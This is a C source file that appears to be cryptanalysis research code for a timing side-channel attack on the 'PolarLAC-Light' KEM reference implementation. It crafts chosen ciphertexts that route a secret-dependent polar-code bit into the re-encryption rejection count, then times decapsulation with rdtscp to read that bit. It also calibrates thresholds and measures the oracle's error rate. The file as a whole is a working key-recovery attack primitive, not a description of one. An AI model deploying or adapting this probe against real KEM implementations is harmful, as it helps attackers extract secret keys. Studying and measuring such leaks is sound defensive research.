/* canary_probe.c  REAL-setting slow-canary timing PCO test for PolarLAC-Light.
   Links UNMODIFIED reference objects. The probe is the real attack primitive:
   u = C*X^a in module slot k routes a 32-coeff block into the REP-32 polar node
   [0..31]; that node's single info bit is secret-dependent (what we want to read).
   The other 127 info bits come from channels 32..255 ("partners").

   SLOW-CANARY: to make the secret-dependent REP-bit flip move the FO re-encryption
   rejection count R across a large timing gap (R=4 vs R>=6), we search offline over
   partner grid-code patterns for one where the two possible decrypted messages
   m0 (REP=0) and m1 (REP=1) satisfy R(m0)=4 and R(m1)>=6 (or vice versa).

   The timing oracle's ONLY input is the measured decap cycle count. Secret key is
   used ONLY to (a) label ground-truth for scoring and (b) score recovery, NEVER to
   build the canary or feed the oracle.  All timing: rdtscp+lfence, min-of-k, pinned.
*/
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "drng.h"
#include "params.h"
#include "KEM_AlgorithmInstance.h"
#include "pke.h"
#include "poly.h"
#include "sample.h"
#include "fft.h"
#include "symmetric.h"
#include "ntt.h"

DRNG_ctx drng_algorithm;
static uint8_t PK[PKE_PUBLIC_KEY_BYTES+64], SK[KEM_SK_BYTES+64];
static unsigned long long PKL,SKL;
static int16_t STRUE[RL_KEM_K][RL_KEM_N]; /* scoring/labeling only */
#define C 32

static inline uint64_t rdtscp(void){unsigned lo,hi,aux;__asm__ __volatile__("rdtscp":"=a"(lo),"=d"(hi),"=c"(aux));return((uint64_t)hi<<32)|lo;}
static inline void lfence(void){__asm__ __volatile__("lfence":::"memory");}
static int pmod(int a,int m){a%=m; if(a<0)a+=m; return a;}
static int grid_val(int w){ return (int)(((( (uint32_t)w*RL_KEM_Q))+ (1u<<(D_C2_BITS-1)) )>>D_C2_BITS); }

static int recompute_R(const uint8_t *m){
    uint8_t din[PKE_MESSAGE_BYTES+PKE_PUBLIC_KEY_BYTES];
    uint8_t gout[KEM_SS_BYTES+KEM_SEED_LEN_BYTES];
    memcpy(din,m,PKE_MESSAGE_BYTES); memcpy(din+PKE_MESSAGE_BYTES,PK,PKE_PUBLIC_KEY_BYTES);
    bit_xof((KEM_SS_BYTES+KEM_SEED_LEN_BYTES)*8ULL,din,sizeof(din)*8ULL,gout);
    const uint8_t*se=gout+KEM_SS_BYTES; uint8_t nonce=0; int R=0; int16_t cand[RL_KEM_N];
    for(int p=0;p<4;p++){for(;;){poly_generate_tenary(cand,se,nonce);nonce++;R++;if(fft_within_bound_int16(cand,(int32_t)RL_KEM_T))break;}}
    return R;
}
/* build ciphertext: u = C*X^a in slot k; c2 codeword cw[0..255] (3-bit grid codes). */
static void build_ct(uint8_t*ct,int k,int a,const uint8_t*cw){
    polarlac_polyvec u; memset(&u,0,sizeof(u)); u.vec[k].coeffs[a]=(int16_t)C;
    polyvec_byte_compress(ct,&u);
    uint8_t com[RL_KEM_Lv]; for(int i=0;i<RL_KEM_Lv;i++)com[i]=(uint8_t)(cw[i]&7);
    pack_c2_dbit(ct+C1_LEN_BYTES,com);
}
static void decrypt_msg(uint8_t*m,const uint8_t*ct){ PKE_Decrypt(m,ct,SK); }

static uint64_t time_dec_mink(const uint8_t*ct,int k){
    uint8_t ss[64];unsigned long long sl;uint64_t best=~0ULL;
    for(int i=0;i<k;i++){lfence();uint64_t t0=rdtscp();lfence();kem_dec(SK,SKL,(uint8_t*)ct,PKE_CIPHERTEXT_BYTES,ss,&sl);lfence();uint64_t t1=rdtscp();lfence();uint64_t d=t1-t0;if(d<best)best=d;}
    return best;
}
static uint64_t T_lo=176000; /* threshold: below => R=4 (fast), above => R>=6 (slow) */
static int cmp_u64(const void*a,const void*b){uint64_t x=*(const uint64_t*)a,y=*(const uint64_t*)b;return(x>y)-(x<y);}

/* partner pattern: cw for channels 32..255. flip[j]=1 => grid4 (bit1, lower |LLR|), else grid0. */
static void make_cw(uint8_t*cw,const uint8_t*flip /*len 256, only 32..255 used*/,int target_grid){
    for(int i=0;i<RL_KEM_Lv;i++){
        if(i<32) cw[i]=(uint8_t)target_grid;      /* target block channels forced */
        else     cw[i]=(uint8_t)(flip[i]?4:0);    /* partners */
    }
}

int main(int argc,char**argv){
    int MINK   = argc>1?atoi(argv[1]):15;
    int MAXTRY = argc>2?atoi(argv[2]):20000;  /* canary search patterns */
    int NPROBE = argc>3?atoi(argv[3]):2000;   /* probe queries to measure oracle error */
    int SLOTK  = argc>4?atoi(argv[4]):0;
    int BLOCKB = argc>5?atoi(argv[5]):0;
    int FLIPDEN= argc>6?atoi(argv[6]):8;      /* avg #partner-flips = 224/FLIPDEN control */
    uint8_t ds[48];for(int i=0;i<48;i++)ds[i]=(uint8_t)(i*7+1);
    init_random_number(&drng_algorithm,ds,sizeof(ds));
    if(kem_keygen(PK,&PKL,SK,&SKL)!=0){fprintf(stderr,"keygen fail\n");return 1;}
    { const int16_t *sn=(const int16_t*)SK;
      for(int k=0;k<RL_KEM_K;k++){int16_t tmp[RL_KEM_N];
        for(int i=0;i<RL_KEM_N;i++)tmp[i]=sn[k*RL_KEM_N+i]; mq_poly_intt(tmp);
        for(int i=0;i<RL_KEM_N;i++){int v=pmod(tmp[i],RL_KEM_Q); if(v>RL_KEM_Q/2)v-=RL_KEM_Q; STRUE[k][i]=(int16_t)v;} } }
    int a = pmod(0-32*BLOCKB, RL_KEM_N);
    srand(12345);

    /* warmup */
    {uint8_t cw[RL_KEM_Lv],ct[PKE_CIPHERTEXT_BYTES];uint8_t fl[256];memset(fl,0,sizeof(fl));
     make_cw(cw,fl,0);build_ct(ct,SLOTK,a,cw); for(int w=0;w<3000;w++)time_dec_mink(ct,3);}

    /* ---- calibrate timing thresholds by true R (recompute_R, SCORING of timing only) ---- */
    {enum{RM=9}; uint64_t*cb[RM]; long cc[RM]={0}; for(int r=0;r<RM;r++)cb[r]=malloc(sizeof(uint64_t)*40000);
     for(int t=0;t<12000;t++){uint8_t cw[RL_KEM_Lv];for(int i=0;i<RL_KEM_Lv;i++)cw[i]=(uint8_t)(rand()&7);
        uint8_t ct[PKE_CIPHERTEXT_BYTES];build_ct(ct,SLOTK,a,cw);uint8_t m[PKE_MESSAGE_BYTES];decrypt_msg(m,ct);
        int Rt=recompute_R(m);if(Rt>=RM)Rt=RM-1;uint64_t c=time_dec_mink(ct,MINK);cb[Rt][cc[Rt]++]=c;}
     uint64_t med[RM];for(int r=0;r<RM;r++){if(cc[r]){qsort(cb[r],cc[r],sizeof(uint64_t),cmp_u64);med[r]=cb[r][cc[r]/2];}else med[r]=0;}
     printf("[calib] medians R4=%llu(n=%ld) R5=%llu(n=%ld) R6=%llu(n=%ld) R7=%llu(n=%ld)\n",
        (unsigned long long)med[4],cc[4],(unsigned long long)med[5],cc[5],
        (unsigned long long)med[6],cc[6],(unsigned long long)med[7],cc[7]);
     /* threshold to separate R4 from R>=6: midpoint of med4 and med6 (fallback med5) */
     if(med[4]&&med[6])T_lo=(med[4]+med[6])/2; else if(med[4]&&med[5])T_lo=med[5]+(med[5]-med[4])/2;
     printf("[calib] T_lo(R4|R>=6)=%llu\n",(unsigned long long)T_lo);
     /* measure raw R4-vs-R>=6 timing classifier error on calib data */
     long n46=0,e46=0;
     for(long i=0;i<cc[4];i++){n46++; if(cb[4][i]>=T_lo)e46++;}
     for(int r=6;r<RM;r++)for(long i=0;i<cc[r];i++){n46++; if(cb[r][i]<T_lo)e46++;}
     printf("[calib] raw R4-vs-R>=6 timing err = %ld/%ld = %.4f%%\n",e46,n46,100.0*e46/n46);
     for(int r=0;r<RM;r++)free(cb[r]);}

    /* ---------- CANARY SEARCH (offline, secret-independent construction) ---------- */
    /* try partner patterns; for each compute m0 (target=grid0 => REP forced 0-side) and
       m1 (target=grid4 => REP forced 1-side); accept when R0==4 && R1>=6 (or swapped).
       Record min #partner-flips. */
    uint8_t canary[256]; int have=0; int canary_flips=0,canR0=0,canR1=0; long searched=0;
    uint8_t m0chk[PKE_MESSAGE_BYTES],m1chk[PKE_MESSAGE_BYTES];
    for(int tries=0;tries<MAXTRY && !have;tries++){
        uint8_t fl[256]; memset(fl,0,sizeof(fl)); int nf=0;
        /* flip EXACTLY FLIPDEN partner channels (fixed small count) */
        while(nf<FLIPDEN){int i=32+rand()%224; if(!fl[i]){fl[i]=1;nf++;}}
        uint8_t cw[RL_KEM_Lv],ct[PKE_CIPHERTEXT_BYTES],m0[PKE_MESSAGE_BYTES],m1[PKE_MESSAGE_BYTES];
        make_cw(cw,fl,0); build_ct(ct,SLOTK,a,cw); decrypt_msg(m0,ct); int R0=recompute_R(m0);
        make_cw(cw,fl,4); build_ct(ct,SLOTK,a,cw); decrypt_msg(m1,ct); int R1=recompute_R(m1);
        searched++;
        int ok = (R0==4 && R1>=6) || (R1==4 && R0>=6);
        if(ok){ memcpy(canary,fl,256); have=1; canary_flips=nf; canR0=R0; canR1=R1;
                memcpy(m0chk,m0,PKE_MESSAGE_BYTES); memcpy(m1chk,m1,PKE_MESSAGE_BYTES); }
    }
    if(!have){ printf("[canary] NOT FOUND in %ld patterns (FLIPDEN=%d). slow-canary infeasible here.\n",searched,FLIPDEN); return 0; }
    printf("[canary] FOUND after %ld patterns: partner-flips=%d  R(target-grid0)=%d R(target-grid4)=%d\n",
           searched,canary_flips,canR0,canR1);
    int slow_is_grid4 = (canR1>=6);
    int Rslow = slow_is_grid4?canR1:canR0, Rfast = slow_is_grid4?canR0:canR1;
    printf("[canary] fast(R=%d) vs slow(R=%d).  slow side = target-grid%d\n",Rfast,Rslow,slow_is_grid4?4:0);

    /* ---------- PROBE + ORACLE ERROR in REAL setting ---------- */
    /* For NPROBE queries: random target grid codes on channels 0..31, partners=canary.
       ground-truth REP bit determined by which of {m0chk,m1chk} the actual decryption
       equals (scoring only). If decryption != either, it is an OFF-MODEL query.
       Timing oracle predicts slow/fast from measured cycles; compare. Also compute exact
       R(m) via recompute_R to separate timing-noise from R-collision. */
    long tot=0, offmodel=0, tim_err=0, exactR_err=0, matched0=0,matched1=0;
    long fast_true=0, slow_true=0;
    for(int q=0;q<NPROBE;q++){
        uint8_t fl[256]; memcpy(fl,canary,256);
        uint8_t cw[RL_KEM_Lv]; make_cw(cw,fl,0); /* partners from canary */
        for(int i=0;i<32;i++) cw[i]=(uint8_t)(rand()&7); /* random target probe */
        uint8_t ct[PKE_CIPHERTEXT_BYTES]; build_ct(ct,SLOTK,a,cw);
        uint8_t m[PKE_MESSAGE_BYTES]; decrypt_msg(m,ct);
        int eq0 = memcmp(m,m0chk,PKE_MESSAGE_BYTES)==0;
        int eq1 = memcmp(m,m1chk,PKE_MESSAGE_BYTES)==0;
        tot++;
        if(!eq0 && !eq1){ offmodel++; continue; } /* message not one of the 2 canary outcomes */
        /* ground-truth: is this the SLOW message? */
        int gt_slow = slow_is_grid4 ? eq1 : eq0;
        if(gt_slow)slow_true++; else fast_true++;
        if(eq0)matched0++; else matched1++;
        /* exact R oracle (upper bound on achievable if timing were perfect) */
        int Rex = recompute_R(m);
        int exact_slow = (Rex>=6);
        if(exact_slow!=gt_slow) exactR_err++;
        /* timing oracle */
        uint64_t c = time_dec_mink(ct,MINK);
        int tim_slow = (c>=T_lo);
        if(tim_slow!=gt_slow) tim_err++;
    }
    long onmodel = tot-offmodel;
    printf("[probe] NPROBE=%d  on-model=%ld off-model=%ld (%.2f%%)\n",NPROBE,onmodel,offmodel,100.0*offmodel/tot);
    printf("[probe] on-model split: fast-true=%ld slow-true=%ld (matched m0=%ld m1=%ld)\n",fast_true,slow_true,matched0,matched1);
    if(onmodel>0){
      printf("[probe] exact-R oracle err (ceiling) = %ld/%ld = %.4f%%\n",exactR_err,onmodel,100.0*exactR_err/onmodel);
      printf("[probe] TIMING oracle per-query err   = %ld/%ld = %.4f%%\n",tim_err,onmodel,100.0*tim_err/onmodel);
    }
    /* Also report the honest per-query error INCLUDING off-model as errors (worst case),
       since in a real solve an off-model query gives an unpredictable bit. */
    printf("[probe] TIMING err incl off-model as error = %ld/%ld = %.4f%%\n",
           tim_err+offmodel,tot,100.0*(tim_err+offmodel)/tot);
    return 0;
}
